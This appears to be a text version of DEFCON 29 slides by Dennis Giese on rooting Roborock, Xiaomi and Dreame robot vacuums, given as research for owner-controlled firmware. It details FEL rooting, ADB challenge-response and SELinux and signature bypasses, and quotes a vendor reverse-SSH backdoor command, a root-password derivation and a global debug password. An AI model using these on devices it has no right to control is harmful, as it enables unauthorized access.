### Security Measures
- **Application-Specific Programs**: All application-specific programs are protected.
- **Key Storage**: Keys are stored in OPTEE or ARM TrustZone.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Security Enhancements
- **Signed ELF-Binaries and Kernel Verification**: Ensures the integrity of executable files and the kernel.
- **Firmware Updates**: 
  - Signed and encrypted to ensure authenticity and confidentiality.
  - Unique keys for each firmware version.
  - Master keys stored in OPTEE or TrustZone.
- **IPtables Binary**: Cannot flush or delete rules, enhancing network security.
- **Locked UART**: Prevents unauthorized access via the Universal Asynchronous Receiver/Transmitter interface.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Partition Details
| Label     | Content                                      | Mountpoint         | LUKS | DM-verity |
|-----------|----------------------------------------------|--------------------|------|-----------|
| app       | `device.conf` (DID, key, MAC), `adb.conf`, `vinda` | `/mnt/default/`    | ✗    | ✗         |
| system_a  | Copy of OS (active by default)               | `/`                | ✗    | ✓         |
| system_b  | Copy of OS (passive by default)              | -                  | ✗    | ✓         |
| app_a     | Robot application and libraries (active)     | `/opt`             | ✓    | ✗         |
| app_b     | Robot application and libraries (passive)    | -                  | ✓    | ✗         |
| reserve   | Config and calibration files                 | `/mnt/reserve/`    | ✓    | ✗         |
| rtmpdata  | Logs and maps                                | `/mnt/data`        | ✓    | ✗         |

**DEFCON 29 – Dennis Giese (08.08.2021)**

### New Rooting Methods (Roborock)
**DEFCON 29 – Dennis Giese (08.08.2021)**

### Unrooted Robots
- Roborock S7
- Xiaomi M1S
- Roborock S6 MaxV

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Roborock S7 Rooting
- **Mainboard Compatibility**: Same as S5 Max, S6 Pure, etc.
- **Challenges**:
  - U-Boot patched, making UART method ineffective.
  - RootFS is a read-only SquashFS.
- **New Method: FEL Rooting**:
  - No soldering required.
  - Requires disassembly.
  - Automatically patches RootFS and enables SSH.
  - Applicable to all current NAND-based Roborock models.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### PCB Reverse Engineering
- **Old Method: UART**
  - UART pins were known but became useless after blocking.
  - Allwinner SOCs have FEL mode, a low-level mode allowing device flashing.
  - Idea: Boot custom OS via FEL.
  - Typical methods to trigger FEL: Disable Flash IC, pull BOOT Mode/FEL pin.
  - Reference: [Linux Sunxi FEL](https://linux-sunxi.org/FEL)

- **New Method: FEL**
  - Destructive desoldering and probing.
  - SOC: Allwinner.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Booting via FEL
- **Challenge**: NAND support is proprietary.
- **Approach**:
  - Extract kernel config from Rockrobo kernel.
  - Create InitramFS with Dropbear, SSH keys, and tools.
  - Compile minimal Kernel using public Nintendo NES Classic sources.
  - Create custom U-Boot version with extracted Roborock config.
  - Trigger FEL Mode by shorting TPA17 to GND.
  - Load U-Boot, Kernel, and InitramFS into RAM via USB.
  - Boot and automatically patch the SquashFS RootFS.
  - References: [Nintendo OSS Data](https://www.nintendo.co.jp/support/oss/data/SuperNESClassicEdition_OSS.zip), [FEL Resources](https://builder.dontvacuum.me/fel-ressources)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### FEL Image Patching Process
- **Steps**:
  - Boot into FEL image.
  - Decompress SquashFS.
  - Patch RootFS image (install "authorized_keys" and custom Dropbear SSH server).
  - Compress SquashFS image.
  - Overwrite partition with new image.
  - Result: SSH access and root.
  - References: [FEL Resources](https://builder.dontvacuum.me/fel-ressources), [How-tos](https://builder.dontvacuum.me/howtos)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### FEL Rooting Advantages
- No soldering required.
- Simple process.
- Allows restoration of bricked devices.
- Applicable to all Allwinner-based devices.
- Reference: [FEL Resources](https://builder.dontvacuum.me/fel-ressources)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Unrooted Robots
- Roborock S7
- Xiaomi M1S
- Roborock S6 MaxV

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Xiaomi M1S / S6 MaxV Rooting
- **Challenges**:
  - All ports closed or firewalled.
  - Filesystems encrypted or integrity protected.
  - USB interface protected with custom adbd.
- **Idea: Layered Approach**:
  - Break in via USB.
  - Disable SELinux.
  - Patch application partition.
- **Note**: While possible, it may be difficult for many people.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Level 1: Get ADB Shell
- **ADB Authentication**:
  - Uses challenge-response authentication based on VINDA secret.
  - Mode controlled by `adb.conf`.
  - Relevant files stored on the "default" partition and not protected.
- **Idea**:
  - Connect to Flash via ISP or de-solder it.
  - Extract or create VINDA secret.
  - Use tool to compute challenge response.
  - Reference: [VINDA Tool](https://builder.dontvacuum.me/vinda)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### ISP Access
- **Xiaomi M1S and Roborock S6 MaxV**:
  - CAUTION: If you don't know what you're doing, you're likely to brick your device.
  - Recommended method: Use an adapter, which requires reflow soldering and re-balling equipment.
  - Reference: [ISP Access](https://builder.dontvacuum.me/vinda)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Level 1 Result
- Set vinda to "UUUUUUUUUUUUUUUU".
- Steps:
  1. Get serial number.
  2. Get challenge.
  3. Compute response using serial number and challenge.
  4. Execute commands.
- Thanks to Erik Uhlmann for his support.
- Reference: [VINDA Tool](https://builder.dontvacuum.me/vinda)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Level 2: Disable SELinux
- **Shell Access**:
  - SELinux is enforced, blocking network access and /dev access.
  - Allowed: bind-mounts and "kill" command.
- **Idea**:
  - Copy `/opt/rockrobo/miio` to `/tmp/miio`.
  - Replace `miio_client` with a bash script.
  - Bind-mount `/tmp/miio` to `/opt/rockrobo/miio`.
  - Kill `miio_client` to execute the bash script.
- **Result**:
  - Watchdog will restart `miio_client` if it gets killed.
  - Steps:
    1. Get the current mode of SELinux.
    2. Find PID of `miio_client` process.
    3. Copy `miio` directory to `/tmp`.
    4. Create a bash script in place of `miio_client` to disable SELinux.
    5. Bind-mount modified directory to `/opt/rockrobo/miio`.
    6. Kill `miio_client` process.
    7. Enjoy.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Level 3: Modify Application Partition
- **Full Root Access**:
  - Temporary full root access.
  - "app" partition not integrity protected.
  - Modify scripts to disable SELinux and start Dropbear on a different port.
  - Limitation: ELF binaries need to be signed.
  - Backdoor: Any file named `librrafm.so` is whitelisted.
- **Thanks to Erik Uhlmann for his support.**

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Level 3 Result
- **Running Valetudo**:
  - Download Valetudo.
  - Realize it doesn’t work due to custom ELF signature.
  - Rename Valetudo to `librrafm.so`.
  - Enjoy working Valetudo.
- **Example**:
  - Download Valetudo: `wget https://github.com/Hypfer/Valetudo/.../valetudo-armv7`
  - Attempt to run: `./valetudo-armv7` results in segmentation fault.
  - Rename: `mv valetudo-armv7 librrafm.so`
  - Run successfully: `./librrafm.so`

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Other Ideas for M1S / S6 MaxV
- Ask OPTEE nicely to decrypt firmware updates.
- Access cameras directly (via GStreamer).
- Extract Machine Learning Models.
- Find all the backdoors.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Summary: Roborock
- Easy method to root S7 and other models.
- Root for Xiaomi M1S and Roborock S6 MaxV.
- Method is dangerous and can brick the device.
- Only feasible with equipment and experience.
- Recommendation: Avoid new Roborock models if you want root.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### A New Player: Dreame
**DEFCON 29 – Dennis Giese (08.08.2021)**

### Dreame: A New Alternative
- **First Model Released in 2019**:
  - OEM products for Xiaomi.
  - Models: Xiaomi 1C and Dreame F9 (VSLAM), Dreame D9 (LiDAR), Xiaomi 1T (VSLAM + ToF), Dreame L10 Pro (LiDAR + Line Laser + Camera).
  - Allwinner SoC.
  - OS based on Android.
  - Robot software: AVA.
- **Pictures of Models**:
  - [Robot Info](https://dontvacuum.me/robotinfo/)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Video Perspectives
- **Xiaomi 1C/Dreame F9**: Recorded with camera_demo and AVA recording commands.
- **Time-of-Flight Camera (Xiaomi 1T)**: Point cloud obtained by AVA commands.
- **Line Laser (Dreame L10 Pro)**: Recorded with activated line laser from `/dev/video1`.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Rooting Dreame
**DEFCON 29 – Dennis Giese (08.08.2021)**

### Easy Opening and Root
- **First Root**: December 2019 (1C).
- **Connector**: All models have the same connector, accessible without breaking warranty seals.
- **Extracted Key Material and Firmware**.
- **Reverse Engineered Flashing via FEL**:
  - Usage of Banana Pi tools.
  - Flashing with PhoenixUSB (Windows only).
  - Reference: [BPI-M3 BSP](https://github.com/BPI-SINOVOIP/BPI-M3-bsp)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Debug Pinout
- **Front**:
  - Boot_SEL, RX, TX, D+, D-, VBUS (Do not connect), GND.
- **Debug Interface**:
  - 2x8 pins, 2mm pitch size.
  - Warning: 2mm pitch size is smaller than the usual 2.54 mm.
  - Ensure correct pin connections.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Rooting with Custom PCBs
- **Gerber Files**:
  - [Dreame Adapter](https://builder.dontvacuum.me/dreameadapter)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Examples of Connections
- **USB, UART, Marker** (needs to be on the right):
  - [Dreame Adapter Gerber Files](https://builder.dontvacuum.me/dreameadapter)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Interesting Findings
**DEFCON 29 – Dennis Giese (08.08.2021)**

### AutoSSH Backdoor
- **Trigger Reverse SSH Shell**:
  - `sshpass -p xxx ssh -p 10022 -o StrictHostKeyChecking=no -fCNR last-4-digits-of-sn:127.0.0.1:22 PI:EMAIL`
- **Hardcoded Credentials**:
  - User has sudo rights.
  - Server used for development.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Debug Scripts
- **Startup Debug Script**:
  - Unencrypted FTP download from personal developer NAS.
- **Log Uploads**:
  - With admin credentials.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Obfuscated Root Password
- **Device Root Password**:
  - Derived as Base64(SHA1(Serial number)).
- **Debug Firmwares Password** (globally):
  - `#share!#`

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Chatty Functions
- **Debug Functions**:
  - Recording and upload of pictures and camera recordings.
- **Log Files**:
  - Device produces many log files.
- **Prevent Uploads**:
  - Rooting is the only way to prevent uploads.

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Summary: Dreame
- **Cost-Effective**: Devices are cheaper than Roborock.
- **Performant Hardware**.
- **Valetudo Support**: Full support since April 2021.
- **Rooting**: All current models can be rooted without soldering (before Aug 2021).
- **Software Concerns**: Questionable remains in the software.
- **Reference**: [Valetudo Cloud](https://valetudo.cloud/)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Dustbuilder
**DEFCON 29 – Dennis Giese (08.08.2021)**

### Dustbuilder
- **Website for Custom Robot Firmwares**:
  - Reproducible builds.
  - Easy to use.
  - Works for Dreame, Roborock, and Viomi.
- **Alternative to Local Building**:
  - All tools published on GitHub.
- **URL**: [Dustbuilder](http://builder.dontvacuum.me/)

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Acknowledgements
- Ben Helfrich
- Carolin Gross
- Cameron Kennedy
- Daniel Wegemer
- Erik Uhlmann
- Guevara Noubir
- Sören Beye

**DEFCON 29 – Dennis Giese (08.08.2021)**

### Contact
- **Website**: [DontVacuum.me](http://dontvacuum.me)
- **Telegram**: [t.me/dgiese](https://t.me/dgiese)
- **Twitter**: @dgi_DE
- **Email**: PI:EMAIL